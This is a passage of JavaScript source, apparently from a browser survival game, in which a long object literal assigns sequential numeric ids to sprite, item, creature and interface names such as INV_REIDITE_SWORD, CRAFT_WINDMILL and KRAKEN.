      DIAMOND_DOOR_SPIKE: he++,
      AMETHYST_DOOR_SPIKE: he++,
      REIDITE_WALL: he++,
      REIDITE_DOOR: he++,
      REIDITE_SPIKE: he++,
      REIDITE_DOOR_SPIKE: he++,
      WOOD_TOWER: he++,
      PENGUIN_FEATHER: he++,
      BOAT: he++,
      SLED: he++,
      BOAT_WAVE: he++,
      SLED_WAVE: he++,
      MOUNT_BOAR: he++,
      BOAR_STEP: he++,
      CRAB_STICK: he++,
      CRAB_LOOT: he++,
      CRAB_BOSS: he++,
      BABY_DRAGON: he++,
      BABY_LAVA: he++,
      CRAB_STEP: he++,
      HAWK: he++,
      PLANE: he++,
      HAWK_FEATHER: he++,
      VULTURE: he++,
      ALOE_VERA: he++,
      VULTURE_FEATHER: he++,
      EMERALD: he++,
      FUR_BOAR: he++,
      DECORATION: he++,
      FOD: he++,
      FIREFLY: he++,
      HURT_FIREFLY: he++,
      SPELL: he++,
      BABY_MAMMOTH: he++,
      BABY_MAMMOTH_STEP: he++,
      CRATE: he++,
      SEED: he++,
      INV_DRAGON_ORB: he++,
      INV_LAVA_ORB: he++,
      CRAFT_SWORD: he++,
      BODY: he++,
      CRAFT_PICK: he++,
      CRAFT_PICK_DIAMOND: he++,
      INV_PICK_GOLD: he++,
      MINIMAP: he++,
      SPIDER: he++,
      INV_SWORD: he++,
      CRAFT_WORK: he++,
      CRAFT_STONE_WALL: he++,
      RABBIT: he++,
      CRAFT_GOLD_WALL: he++,
      WEB: he++,
      GAUGES: he++,
      CRAFT_DOOR_WOOD_CLOSE: he++,
      CHEST_PLANT: he++,
      CHEST_GOLD: he++,
      CHEST_DIAMOND: he++,
      CHEST_PICK_GOLD: he++,
      CHEST_FIRE: he++,
      CHEST_PICK_WOOD: he++,
      CHEST_MEAT: he++,
      CHEST_BIG_FIRE: he++,
      INV_PLANT: he++,
      LEADERBOARD: he++,
      HURT: he++,
      COLD: he++,
      HUNGER: he++,
      GROUND_FIRE: he++,
      COUNTER: he++,
      CRAFT_SEED: he++,
      HERB: he++,
      HAND_SHADOW: he++,
      PLANT_MINI: he++,
      FIRE: he++,
      HALO_FIRE: he++,
      CRAFT_SWORD_GOLD: he++,
      CRAFT_SWORD_DIAMOND: he++,
      INV_SWORD_GOLD: he++,
      INV_SWORD_DIAMOND: he++,
      FRUIT: he++,
      CRAFT_PICK_GOLD: he++,
      INV_PICK_DIAMOND: he++,
      INV_GOLD: he++,
      INV_DIAMOND: he++,
      WOLF: he++,
      INV_MEAT: he++,
      GEAR2: he++,
      CRAFT_FIRE: he++,
      INV_BANDAGE: he++,
      CRAFT_BANDAGE: he++,
      INV_CORD: he++,
      YOUR_SCORE: he++,
      TREE_BRANCH: he++,
      HEAL: he++,
      INV_FIRE: he++,
      INV_WORK: he++,
      INV_SEED: he++,
      INV_PICK: he++,
      INV_PICK_WOOD: he++,
      CRAFT_PICK_WOOD: he++,
      INV_STONE: he++,
      INV_WOOD: he++,
      INV_WALL: he++,
      CRAFT_WALL: he++,
      INV_SPIKE: he++,
      CRAFT_SPIKE: he++,
      WHEAT_MOB: he++,
      HURT_RABBIT: he++,
      INV_COOKED_MEAT: he++,
      GEAR: he++,
      CRAFT_COOKED_MEAT: he++,
      HURT_WOLF: he++,
      CRAFT_BIG_FIRE: he++,
      INV_BIG_FIRE: he++,
      INV_STONE_WALL: he++,
      INV_GOLD_WALL: he++,
      INV_DIAMOND_WALL: he++,
      CRAFT_DIAMOND_WALL: he++,
      HURT_SPIDER: he++,
      EMPTY_SLOT: he++,
      INV_DOOR_WOOD_CLOSE: he++,
      DOOR_WOOD_OPEN: he++,
      INV_CHEST: he++,
      CRAFT_CHEST: he++,
      CHEST_SLOT: he++,
      CHEST_SWORD: he++,
      CHEST_PICK: he++,
      CHEST_STONE: he++,
      CHEST_WOOD: he++,
      CHEST_PICK_DIAMOND: he++,
      CHEST_SWORD_GOLD: he++,
      CHEST_SWORD_DIAMOND: he++,
      CHEST_WORK: he++,
      CHEST_SEED: he++,
      CHEST_WALL: he++,
      CHEST_SPIKE: he++,
      CHEST_COOKED_MEAT: he++,
      CHEST_BANDAGE: he++,
      CHEST_CORD: he++,
      CHEST_STONE_WALL: he++,
      CHEST_GOLD_WALL: he++,
      CHEST_DIAMOND_WALL: he++,
      CHEST_DOOR_WOOD_CLOSE: he++,
      CHEST_WORKBENCH: he++,
      CHEST_CHEST: he++,
      CRAFT_STONE_SPIKE: he++,
      INV_STONE_SPIKE: he++,
      INV_GOLD_SPIKE: he++,
      CRAFT_GOLD_SPIKE: he++,
      INV_DIAMOND_SPIKE: he++,
      CRAFT_DIAMOND_SPIKE: he++,
      CHEST_PLUS: he++,
      CRAFT_BAG: he++,
      INV_FUR: he++,
      INV_EARMUFFS: he++,
      CRAFT_EARMUFFS: he++,
      CRAFT_DOOR_STONE_CLOSE: he++,
      INV_DOOR_STONE_CLOSE: he++,
      DOOR_STONE_OPEN: he++,
      CRAFT_DOOR_GOLD_CLOSE: he++,
      INV_DOOR_GOLD_CLOSE: he++,
      DOOR_GOLD_OPEN: he++,
      CRAFT_DOOR_DIAMOND_CLOSE: he++,
      INV_DOOR_DIAMOND_CLOSE: he++,
      DOOR_DIAMOND_OPEN: he++,
      CRAFT_COAT: he++,
      INV_COAT: he++,
      CHEST_STONE_SPIKE: he++,
      CHEST_GOLD_SPIKE: he++,
      CHEST_DIAMOND_SPIKE: he++,
      CHEST_BAG: he++,
      CHEST_FUR: he++,
      CHEST_EARMUFFS: he++,
      CHEST_DOOR_STONE_CLOSE: he++,
      CHEST_DOOR_GOLD_CLOSE: he++,
      CHEST_DOOR_DIAMOND_CLOSE: he++,
      CHEST_COAT: he++,
      INV_BAG: he++,
      INV_FUR_WOLF: he++,
      CHEST_FUR_WOLF: he++,
      INV_SPEAR: he++,
      CRAFT_SPEAR: he++,
      CHEST_SPEAR: he++,
      INV_GOLD_SPEAR: he++,
      CRAFT_GOLD_SPEAR: he++,
      CHEST_GOLD_SPEAR: he++,
      INV_WOOD_SPEAR: he++,
      CRAFT_WOOD_SPEAR: he++,
      CHEST_WOOD_SPEAR: he++,
      INV_DIAMOND_SPEAR: he++,
      CRAFT_DIAMOND_SPEAR: he++,
      CHEST_DIAMOND_SPEAR: he++,
      FURNACE_ON: he++,
      INV_FURNACE: he++,
      CRAFT_FURNACE: he++,
      CHEST_FURNACE: he++,
      FURNACE_SLOT: he++,
      FURNACE_BUTTON: he++,
      FIR: he++,
      STONES_WINTER: he++,
      GOLD_WINTER: he++,
      DIAMOND_WINTER: he++,
      GROUND_FIRE_WINTER: he++,
      INV_AMETHYST: he++,
      FOX: he++,
      INV_EXPLORER_HAT: he++,
      CRAFT_EXPLORER_HAT: he++,
      CHEST_EXPLORER_HAT: he++,
      INV_PIRATE_HAT: he++,
      CRAFT_PIRATE_HAT: he++,
      CHEST_PIRATE_HAT: he++,
      INV_PILOT_HELMET: he++,
      CRAFT_PILOT_HELMET: he++,
      CHEST_PILOT_HELMET: he++,
      INV_STONE_HELMET: he++,
      CRAFT_STONE_HELMET: he++,
      CHEST_STONE_HELMET: he++,
      INV_GOLD_HELMET: he++,
      CRAFT_GOLD_HELMET: he++,
      CHEST_GOLD_HELMET: he++,
      INV_DIAMOND_HELMET: he++,
      CRAFT_DIAMOND_HELMET: he++,
      CHEST_DIAMOND_HELMET: he++,
      INV_BOOK: he++,
      CRAFT_BOOK: he++,
      CHEST_BOOK: he++,
      INV_PAPER: he++,
      CRAFT_PAPER: he++,
      CHEST_PAPER: he++,
      HERB_WINTER: he++,
      BEAR: he++,
      CHEST_AMETHYST: he++,
      SNOW: he++,
      DRAGON_GROUND: he++,
      DRAGON: he++,
      LAVA_DRAGON: he++,
      WING_LEFT: he++,
      WING_RIGHT: he++,
      LAVA_WING_LEFT: he++,
      LAVA_WING_RIGHT: he++,
      INV_SWORD_AMETHYST: he++,
      CRAFT_SWORD_AMETHYST: he++,
      CHEST_SWORD_AMETHYST: he++,
      INV_PICK_AMETHYST: he++,
      CHEST_PICK_AMETHYST: he++,
      CRAFT_PICK_AMETHYST: he++,
      HURT_FOX: he++,
      HURT_BEAR: he++,
      HURT_DRAGON: he++,
      HURT_LAVA_DRAGON: he++,
      SLOT_NUMBER: he++,
      HURT_WING_LEFT: he++,
      HURT_WING_RIGHT: he++,
      HURT_LAVA_WING_LEFT: he++,
      HURT_LAVA_WING_RIGHT: he++,
      FLAKES: he++,
      DESERT: he++,
      INV_AMETHYST_SPEAR: he++,
      CRAFT_AMETHYST_SPEAR: he++,
      CHEST_AMETHYST_SPEAR: he++,
      SNOW_STEP: he++,
      LAVA_STEP: he++,
      INV_HAMMER: he++,
      CRAFT_HAMMER: he++,
      CHEST_HAMMER: he++,
      INV_HAMMER_GOLD: he++,
      CRAFT_HAMMER_GOLD: he++,
      CHEST_HAMMER_GOLD: he++,
      INV_HAMMER_DIAMOND: he++,
      CRAFT_HAMMER_DIAMOND: he++,
      CHEST_HAMMER_DIAMOND: he++,
      INV_HAMMER_AMETHYST: he++,
      CRAFT_HAMMER_AMETHYST: he++,
      CHEST_HAMMER_AMETHYST: he++,
      INV_HAMMER_REIDITE: he++,
      CRAFT_HAMMER_REIDITE: he++,
      CHEST_HAMMER_REIDITE: he++,
      INV_AMETHYST_WALL: he++,
      CRAFT_AMETHYST_WALL: he++,
      CHEST_AMETHYST_WALL: he++,
      INV_AMETHYST_SPIKE: he++,
      CRAFT_AMETHYST_SPIKE: he++,
      CHEST_AMETHYST_SPIKE: he++,
      CRAFT_DOOR_AMETHYST_CLOSE: he++,
      INV_DOOR_AMETHYST_CLOSE: he++,
      DOOR_AMETHYST_OPEN: he++,
      CHEST_DOOR_AMETHYST_CLOSE: he++,
      INV_CAP_SCARF: he++,
      CRAFT_CAP_SCARF: he++,
      CHEST_CAP_SCARF: he++,
      INV_FUR_WINTER: he++,
      CHEST_FUR_WINTER: he++,
      SLOT_NUMBER: he++,
      DOOR_WOOD_OPEN_WINTER: he++,
      DOOR_STONE_OPEN_WINTER: he++,
      DOOR_GOLD_OPEN_WINTER: he++,
      DOOR_DIAMOND_OPEN_WINTER: he++,
      DOOR_AMETHYST_OPEN_WINTER: he++,
      INV_BLUE_CORD: he++,
      CHEST_BLUE_CORD: he++,
      CRAFT_BLUE_CORD: he++,
      BIGMAP: he++,
      SHOW_SPECTATORS: he++,
      INV_LOCK: he++,
      CRAFT_LOCK: he++,
      CHEST_LOCK: he++,
      INV_DRAGON_HEART: he++,
      CHEST_DRAGON_HEART: he++,
      INV_LAVA_HEART: he++,
      CHEST_LAVA_HEART: he++,
      RECONNECT: he++,
      RESURRECTION_GROUND: he++,
      RESURRECTION_HOLE: he++,
      RESURRECTION_ROTATE: he++,
      INV_RESURRECTION: he++,
      CRAFT_RESURRECTION: he++,
      CHEST_RESURRECTION: he++,
      INV_LOCKPICK: he++,
      CRAFT_LOCKPICK: he++,
      CHEST_LOCKPICK: he++,
      KEY: he++,
      PADLOCK: he++,
      DELAY_WEAPON: he++,
      LOCKED: he++,
      PADLOCK_ON_CHEST: he++,
      BUBBLES: he++,
      INV_AMETHYST_HELMET: he++,
      CRAFT_AMETHYST_HELMET: he++,
      CHEST_AMETHYST_HELMET: he++,
      SPECIAL_ITEMS: he++,
      POINTS: he++,
      AUTO_FEED: he++,
      BANDAGE_ACTIVATED: he++,
      STOP_REGENERATION: he++,
      STOP_REGENERATION_BLIZZARD: he++,
      INV_SUPER_HAMMER: he++,
      CRAFT_SUPER_HAMMER: he++,
      CHEST_SUPER_HAMMER: he++,
      INV_TOTEM: he++,
      CHEST_TOTEM: he++,
      CRAFT_TOTEM: he++,
      TEAM_BUTTON: he++,
      MANAGE_TEAM_BUTTON: he++,
      ICON_MEMBER: he++,
      ICON_LEADER: he++,
      FULL_TEAM_BUTTON: he++,
      SHOW_TEAM_BUTTON: he++,
      DELAY_TEAM: he++,
      INV_DRAGON_SWORD: he++,
      CRAFT_DRAGON_SWORD: he++,
      CHEST_DRAGON_SWORD: he++,
      INV_LAVA_SWORD: he++,
      CRAFT_LAVA_SWORD: he++,
      CHEST_LAVA_SWORD: he++,
      INV_WOOD_BOW: he++,
      CRAFT_WOOD_BOW: he++,
      CHEST_WOOD_BOW: he++,
      INV_STONE_BOW: he++,
      CRAFT_STONE_BOW: he++,
      CHEST_STONE_BOW: he++,
      INV_GOLD_BOW: he++,
      CRAFT_GOLD_BOW: he++,
      CHEST_GOLD_BOW: he++,
      INV_DIAMOND_BOW: he++,
      CRAFT_DIAMOND_BOW: he++,
      CHEST_DIAMOND_BOW: he++,
      INV_AMETHYST_BOW: he++,
      CRAFT_AMETHYST_BOW: he++,
      CHEST_AMETHYST_BOW: he++,
      INV_REIDITE_BOW: he++,
      CRAFT_REIDITE_BOW: he++,
      CHEST_REIDITE_BOW: he++,
      INV_DRAGON_BOW: he++,
      CRAFT_DRAGON_BOW: he++,
      CHEST_DRAGON_BOW: he++,
      CHEST_DRAGON_ORB: he++,
      CHEST_LAVA_ORB: he++,
      SHOP: he++,
      CURSED_SWORD: he++,
      INV_CURSED_SWORD: he++,
      CRAFT_CURSED_SWORD: he++,
      CHEST_CURSED_SWORD: he++,
      ITEM1: he++,
      ITEM2: he++,
      ITEM3: he++,
      ITEM4: he++,
      SAND_BORDER: he++,
      SAND_STEP: he++,
      OCEAN: he++,
      CRAFT_BRIDGE: he++,
      INV_BRIDGE: he++,
      CHEST_BRIDGE: he++,
      LACK: he++,
      OXYGEN: he++,
      INV_SAND: he++,
      CHEST_SAND: he++,
      CRAFT_BOTTLE_EMPTY: he++,
      INV_BOTTLE_EMPTY: he++,
      INV_BOTTLE_FULL: he++,
      CHEST_BOTTLE_EMPTY: he++,
      CHEST_BOTTLE_FULL: he++,
      INV_SHOVEL: he++,
      CHEST_SHOVEL: he++,
      CRAFT_SHOVEL: he++,
      LAKE_DEEP: he++,
      LAKE: he++,
      LAKE_EDGE: he++,
      SHINGLE: he++,
      DRIED_PLANT: he++,
      INV_KRAKEN_SKIN: he++,
      CHEST_KRAKEN_SKIN: he++,
      INV_WATERING_CAN: he++,
      CRAFT_WATERING_CAN: he++,
      CHEST_WATERING_CAN: he++,
      INV_FLOUR: he++,
      CHEST_FLOUR: he++,
      INV_WHEAT_SEED: he++,
      CRAFT_WHEAT_SEED: he++,
      CHEST_WHEAT_SEED: he++,
      INV_COOKIE: he++,
      CRAFT_COOKIE: he++,
      CHEST_COOKIE: he++,
      KRAKEN: he++,
      DRIED_WHEAT: he++,
      INV_WILD_WHEAT: he++,
      CHEST_WILD_WHEAT: he++,
      WINDMILL_WINGS: he++,
      WINDMILL_HEAD: he++,
      CRAFT_WINDMILL: he++,
      INV_WINDMILL: he++,
      CHEST_WINDMILL: he++,
      INV_SUPER_DIVING_SUIT: he++,
      CRAFT_SUPER_DIVING_SUIT: he++,
      CHEST_SUPER_DIVING_SUIT: he++,
      INV_DIVING_MASK: he++,
      CRAFT_DIVING_MASK: he++,
      CHEST_DIVING_MASK: he++,
      INV_WATERING_CAN_FULL: he++,
      CHEST_WATERING_CAN_FULL: he++,
      CRAFT_WATERING_CAN_FULL: he++,
      WINDMILL_CASES: he++,
      EXTRACTOR_CASES: he++,
      WINDMILL_WHEAT_SEED: he++,
      WINDMILL_FLOUR: he++,
      INV_CAKE: he++,
      CRAFT_CAKE: he++,
      CHEST_CAKE: he++,
      INV_FOODFISH: he++,
      CHEST_FOODFISH: he++,
      INV_FOODFISH_COOKED: he++,
      CHEST_FOODFISH_COOKED: he++,
      CRAFT_FOODFISH_COOKED: he++,
      DELAY_DRINK: he++,
      WHEAT_SEED_DRIED: he++,
      HEART_SYMBOL_HUD: he++,
      COLD_SYMBOL_HUD: he++,
      FOOD_SYMBOL_HUD: he++,
      WATER_SYMBOL_HUD: he++,
      PIRANHA: he++,
      INV_SCALES: he++,
      CHEST_SCALES: he++,
      CAVE_STONES: he++,
      HERB_CAVE: he++,
      WATERBLOCK: he++,
      SHADOW_CAVE_STONES: he++,
      CAVE_STEP: he++,
      DELAY_SPIKE: he++,
      CHEST_GROUND: he++,
      CHEST_PLOT: he++,
      CRAFT_PLOT: he++,
      INV_PLOT: he++,
      CHEST_ICE: he++,
      HURT_KRAKEN: he++,
      HURT_PIRANHA: he++,
      CHEST_BREAD: he++,
      CRAFT_BREAD: he++,
      TREASURE_CHEST: he++,
      ISLAND: he++,
      PALM: he++,
      WAVE_ONE: he++,
      WAVE_TWO: he++,
      ISLAND_BLOCK: he++,
      HURT_TREASURE_CHEST: he++,
      ISLAND_STEP: he++,
      INV_SHOVEL_GOLD: he++,
      CRAFT_SHOVEL_GOLD: he++,
      CHEST_SHOVEL_GOLD: he++,
      INV_SHOVEL_DIAMOND: he++,
      CHEST_SHOVEL_DIAMOND: he++,
      CRAFT_SHOVEL_DIAMOND: he++,
      INV_SHOVEL_AMETHYST: he++,
      CRAFT_SHOVEL_AMETHYST: he++,
      CHEST_SHOVEL_AMETHYST: he++,
      RECIPE_BUTTON: he++,
      INV_SPANNER: he++,
      CHEST_SPANNER: he++,
      CRAFT_SPANNER: he++,
      INV_MACHETE: he++,
      CHEST_MACHETE: he++,
      CRAFT_MACHETE: he++,
      CRAFT_BOTTLE_FULL: he++,
      BREAD_OVEN_ON: he++,
      INV_BREAD_OVEN: he++,
      CRAFT_BREAD_OVEN: he++,
      CHEST_BREAD_OVEN: he++,
      BREAD_LIGHT_UP: he++,
      BREAD_LIGHT_DOWN: he++,
      BREAD_OVEN_UI: he++,
      BREAD_OVEN_WOOD: he++,
      BREAD_OVEN_BREAD: he++,
      CLOCK: he++,
      ARROW_CLOCK: he++,
      OPTION_BUTTON: he++,
      DEAD_BOX: he++,
      HURT_DEAD_BOX: he++,
      CRAFT_SANDWICH: he++,
      CHEST_SANDWICH: he++,
      INV_DRAGON_HELMET: he++,
      CHEST_DRAGON_HELMET: he++,
      CRAFT_DRAGON_HELMET: he++,
      INV_LAVA_HELMET: he++,
      CHEST_LAVA_HELMET: he++,
      CRAFT_LAVA_HELMET: he++,
      INV_WITCH: he++,
      CHEST_WITCH: he++,
      CRAFT_WITCH: he++,
      INV_NIMBUS: he++,
      CHEST_NIMBUS: he++,
      CRAFT_NIMBUS: he++,
      INV_WAND1: he++,
      CHEST_WAND1: he++,
      CRAFT_WAND1: he++,
      INV_WAND2: he++,
      CHEST_WAND2: he++,
      CRAFT_WAND2: he++,
      DRAGON_SWORD_HALO: he++,
      INV_DRAGON_CUBE: he++,
      CHEST_DRAGON_CUBE: he++,
      INV_LAVA_CUBE: he++,
      CHEST_LAVA_CUBE: he++,
      QUEST_BUTTON: he++,
      INV_CROWN_GREEN: he++,
      CHEST_CROWN_GREEN: he++,
      CRAFT_CROWN_GREEN: he++,
      CHEST_GEMME_GREEN: he++,
      INV_CROWN_ORANGE: he++,
      CHEST_CROWN_ORANGE: he++,
      CRAFT_CROWN_ORANGE: he++,
      CHEST_GEMME_ORANGE: he++,
      INV_CROWN_BLUE: he++,
      CHEST_CROWN_BLUE: he++,
      CHEST_GEMME_BLUE: he++,
      INV_HOOD: he++,
      CRAFT_HOOD: he++,
      CHEST_HOOD: he++,
      CRAFT_CROWN_BLUE: he++,
      INV_PEASANT: he++,
      CRAFT_PEASANT: he++,
      CHEST_PEASANT: he++,
      CHEST_SPECIAL_FUR: he++,
      CHEST_SPECIAL_FUR_2: he++,
      INV_WINTER_PEASANT: he++,
      CRAFT_WINTER_PEASANT: he++,
      CHEST_WINTER_PEASANT: he++,
      INV_WINTER_HOOD: he++,
      CRAFT_WINTER_HOOD: he++,
      CHEST_WINTER_HOOD: he++,
      SOUND_BUTTON_ON: he++,
      SOUND_BUTTON_OFF: he++,
      CRAFT_BUCKET_FULL: he++,
      CRAFT_BUCKET_EMPTY: he++,
      CHEST_BUCKET_FULL: he++,
      CHEST_BUCKET_EMPTY: he++,
      WELL_FULL: he++,
      INV_WELL: he++,
      CHEST_WELL: he++,
      CRAFT_WELL: he++,
      DELAY_HELMET: he++,
      GLOVES_HOOD: he++,
      DELAY_WALL: he++,
      MARKET_BUTTON: he++,
      ACCESSORY: he++,
      MARKET_BGD: he++,
      DEAD_BOX_UI: he++,
      CRAFT_SIGN: he++,
      INV_SIGN: he++,
      CHEST_SIGN: he++,
      SYMBOLS: he++,
      SIGN_BUTTON: he++,
      TREE_WEB1: he++,
      TREE_WEB2: he++,
      TREE_BRANCH_WEB1: he++,
      TREE_BRANCH_WEB2: he++,
      INV_PUMPKIN_SEED: he++,
      CRAFT_PUMPKIN_SEED: he++,
      CHEST_PUMPKIN_SEED: he++,
      PUMPKIN_SEED_MOB: he++,
      PLANT_PUMPKIN_DRIED: he++,
      DRIED_PUMPKIN: he++,
      INV_PUMPKIN: he++,
      CHEST_PUMPKIN: he++,
      HALO_FIRE_PUMPKIN: he++,
      GROUND_FIRE_PUMPKIN: he++,
      MINIMAP_CTX: he++,
      BIGMAP_CTX: he++,
      ZOMBIE_BODY: he++,
      ZOMBIE_HEAD: he++,
      ZOMBIE_HAND: he++,
      ZOMBIE_HURT: he++,
      ZOMBIE_HUNGER: he++,
      ZOMBIE_HEAL: he++,
      INV_WOOD_HELMET: he++,
      CRAFT_WOOD_HELMET: he++,
      CHEST_WOOD_HELMET: he++,
      INV_SWORD_WOOD: he++,
      CRAFT_SWORD_WOOD: he++,
      CHEST_SWORD_WOOD: he++,
      ZOMBIE_PLAYER: he++,
      VAMPIRE: he++,
      INV_GARLIC_SEED: he++,
      CRAFT_GARLIC_SEED: he++,
      CHEST_GARLIC_SEED: he++,
      GARLIC_SEED_MOB: he++,
      PLANT_GARLIC_DRIED: he++,
      DRIED_GARLIC: he++,
      INV_GARLIC: he++,
      CHEST_GARLIC: he++,
      INV_ROOF: he++,
      CRAFT_ROOF: he++,
      CHEST_ROOF: he++,
      INV_THORNBUSH_SEED: he++,
      CRAFT_THORNBUSH_SEED: he++,
      CHEST_THORNBUSH_SEED: he++,
      THORNBUSH_SEED_MOB: he++,
      PLANT_THORNBUSH_DRIED: he++,
      INV_THORNBUSH: he++,
      CHEST_THORNBUSH: he++,
      CRAFT_THORNBUSH: he++,
      ROOFS: he++,
      GIFT: he++,
      TREE_SNOW1: he++,
      TREE_SNOW2: he++,
      TREE_BRANCH_SNOW1: he++,
      TREE_BRANCH_SNOW2: he++,
      HURT_GIFT: he++,
      INV_PIRATE_SWORD: he++,
      CRAFT_PIRATE_SWORD: he++,
      CHEST_PIRATE_SWORD: he++,
      CHEST_SUGAR_CAN: he++,
      CRAFT_SUGAR_CAN: he++,
      INV_SUGAR_CAN: he++,
      INV_FERRERO: he++,
      CHEST_FERRERO: he++,
      CHEST_CANDY: he++,
      DRIED_THORNBUSH: he++,
      INV_GARLAND: he++,
      CHEST_GARLAND: he++,
      GARLANDS: he++,
      GARLANDS_LIGHT: he++,
      INV_DRAGON_SPEAR: he++,
      CHEST_DRAGON_SPEAR: he++,
      CRAFT_DRAGON_SPEAR: he++,
      INV_LAVA_SPEAR: he++,
      CHEST_LAVA_SPEAR: he++,
      CRAFT_LAVA_SPEAR: he++,
      INV_CHRISTMAS_HAT: he++,
      CHEST_CHRISTMAS_HAT: he++,
      INV_ELF_HAT: he++,
      CHEST_ELF_HAT: he++,
      ROBOT_SKIN: he++,
      VERIFIED: he++,
      CRAB_ATTACK: he++,
      CRAB: he++,
      HURT_CRAB: he++,
      HURT_CRAB_CLAW_LEFT: he++,
      HURT_CRAB_CLAW_RIGHT: he++,
      HEAL_CRAB: he++,
      HEAL_CRAB_CLAW_LEFT: he++,
      HEAL_CRAB_CLAW_RIGHT: he++,
      CRAB_CLAW_LEFT: he++,
      CRAB_CLAW_RIGHT: he++,
      CRAB_CLAW_LEFT_ATTACK: he++,
      CRAB_CLAW_RIGHT_ATTACK: he++,
      CHEST_CRAB_STICK: he++,
      CHEST_CRAB_SPEAR: he++,
      CRAFT_CRAB_SPEAR: he++,
      INV_CRAB_SPEAR: he++,
      FISH1: he++,
      FISH2: he++,
      HURT_FISH1: he++,
      HURT_FISH2: he++,
      CHEST_CRAB_LOOT: he++,
      INV_BED: he++,
      CHEST_BED: he++,
      CRAFT_BED: he++,
      INV_CROWN_CRAB: he++,
      CHEST_CROWN_CRAB: he++,
      CRAFT_CROWN_CRAB: he++,
      BED_TOP: he++,
      HURT_RABBIT_SKIN: he++,
      COLD_RABBIT_SKIN: he++,
      HUNGER_RABBIT_SKIN: he++,
      HEAL_RABBIT_SKIN: he++,
      FIRE_MOB: he++,
      HURT_FIRE_MOB: he++,
      GLOVES_DIAMOND_PROTECTION: he++,
      INV_DIAMOND_PROTECTION: he++,
      CRAFT_DIAMOND_PROTECTION: he++,
      CHEST_DIAMOND_PROTECTION: he++,
      GLOVES_AMETHYST_PROTECTION: he++,
      INV_AMETHYST_PROTECTION: he++,
      CRAFT_AMETHYST_PROTECTION: he++,
      CHEST_AMETHYST_PROTECTION: he++,
      GLOVES_REIDITE_PROTECTION: he++,
      INV_REIDITE_PROTECTION: he++,
      CRAFT_REIDITE_PROTECTION: he++,
      CHEST_REIDITE_PROTECTION: he++,
      INV_REIDITE_SWORD: he++,
      CRAFT_REIDITE_SWORD: he++,
      CHEST_REIDITE_SWORD: he++,
      LAVA_SHINGLE: he++,
      INV_FLAME: he++,
      CHEST_FLAME: he++,
      INV_REIDITE: he++,
      CHEST_REIDITE: he++,
      HERB_LAVA: he++,
      LAVA_BUBBLE: he++,
      ASHES: he++,
      INV_REIDITE_SPEAR: he++,
      CRAFT_REIDITE_SPEAR: he++,
      CHEST_REIDITE_SPEAR: he++,
      INV_REIDITE_HELMET: he++,
      CRAFT_REIDITE_HELMET: he++,
      CHEST_REIDITE_HELMET: he++,
      INV_CARROT_SEED: he++,
      CRAFT_CARROT_SEED: he++,
      CHEST_CARROT_SEED: he++,
      CARROT_SEED_MOB: he++,
      PLANT_CARROT_DRIED: he++,
      DRIED_CARROT: he++,
      INV_CARROT: he++,
      CHEST_CARROT: he++,
      TOMATO_MINI: he++,
      DRIED_TOMATO_MINI: he++,
      INV_TOMATO_SEED: he++,
      CRAFT_TOMATO_SEED: he++,
      CHEST_TOMATO_SEED: he++,
      TOMATO_SEED_MOB: he++,
      PLANT_TOMATO_DRIED: he++,
      DRIED_TOMATO: he++,
      INV_TOMATO: he++,
      INV_WATERMELON_SEED: he++,
      CRAFT_WATERMELON_SEED: he++,
      CHEST_WATERMELON_SEED: he++,
      WATERMELON_SEED_MOB: he++,
      PLANT_WATERMELON_DRIED: he++,
      DRIED_WATERMELON: he++,
      INV_WATERMELON: he++,
      CHEST_WATERMELON: he++,
      CHEST_TOMATO: he++,
      INV_PITCHFORK: he++,
      CHEST_PITCHFORK: he++,
      CRAFT_PITCHFORK: he++,
      INV_PITCHFORK2: he++,
      CHEST_PITCHFORK2: he++,
      CRAFT_PITCHFORK2: he++,
      INV_ALOE_VERA_SEED: he++,
      CRAFT_ALOE_VERA_SEED: he++,
      CHEST_ALOE_VERA_SEED: he++,
      ALOE_VERA_SEED_MOB: he++,
      PLANT_ALOE_VERA_DRIED: he++,
      DRIED_ALOE_VERA: he++,
      INV_ALOE_VERA: he++,
      CHEST_ALOE_VERA: he++,
      CACTUS: he++,
      CRAFT_WOOD_DOOR_SPIKE: he++,
      INV_WOOD_DOOR_SPIKE: he++,
      CHEST_WOOD_DOOR_SPIKE: he++,
      CRAFT_STONE_DOOR_SPIKE: he++,
      INV_STONE_DOOR_SPIKE: he++,
      CHEST_STONE_DOOR_SPIKE: he++,
      CRAFT_GOLD_DOOR_SPIKE: he++,
      INV_GOLD_DOOR_SPIKE: he++,
      CHEST_GOLD_DOOR_SPIKE: he++,
      CRAFT_DIAMOND_DOOR_SPIKE: he++,
      INV_DIAMOND_DOOR_SPIKE: he++,
      CHEST_DIAMOND_DOOR_SPIKE: he++,
      CRAFT_AMETHYST_DOOR_SPIKE: he++,
      INV_AMETHYST_DOOR_SPIKE: he++,
      CHEST_AMETHYST_DOOR_SPIKE: he++,
      CRAFT_REIDITE_DOOR_SPIKE: he++,
      INV_REIDITE_DOOR_SPIKE: he++,
      CHEST_REIDITE_DOOR_SPIKE: he++,
      CRAFT_REIDITE_DOOR: he++,
      INV_REIDITE_DOOR: he++,
      CHEST_REIDITE_DOOR: he++,
      CRAFT_REIDITE_SPIKE: he++,
      INV_REIDITE_SPIKE: he++,
      CHEST_REIDITE_SPIKE: he++,
      CRAFT_REIDITE_WALL: he++,
      INV_REIDITE_WALL: he++,
      CHEST_REIDITE_WALL: he++,
      INV_PICK_REIDITE: he++,
      CHEST_PICK_REIDITE: he++,
      CRAFT_PICK_REIDITE: he++,
      GOLDEN_HEN: he++,
      GOLDEN_CHICKEN: he++,
      HURT_GOLDEN_HEN: he++,
      HURT_GOLDEN_CHICKEN: he++,
      RIVER: he++,
      RIVER_DECO: he++,
      RIVER_WAVE: he++,
      CRAFT_BOAT: he++,
      INV_BOAT: he++,
      CHEST_BOAT: he++,
      CRAFT_SLED: he++,
      INV_SLED: he++,
      CHEST_SLED: he++,
      PENGUIN: he++,
      HURT_PENGUIN: he++,
      INV_PENGUIN_FEATHER: he++,
      CHEST_PENGUIN_FEATHER: he++,
      INV_HAWK_FEATHER: he++,
      CHEST_HAWK_FEATHER: he++,
      INV_VULTURE_FEATHER: he++,
      CHEST_VULTURE_FEATHER: he++,
      FOG: he++,
      BOAR: he++,
      BOAR_TAMED: he++,
      BOAR_ATTACK: he++,
      HURT_BOAR: he++,
      INV_SADDLE: he++,
      CHEST_SADDLE: he++,
      CRAFT_SADDLE: he++,
      INV_MOUNT_BOAR: he++,
      CHEST_MOUNT_BOAR: he++,
      CRAFT_MOUNT_BOAR: he++,
      MARKER: he++,
      CRAB_BOSS_ATTACK: he++,
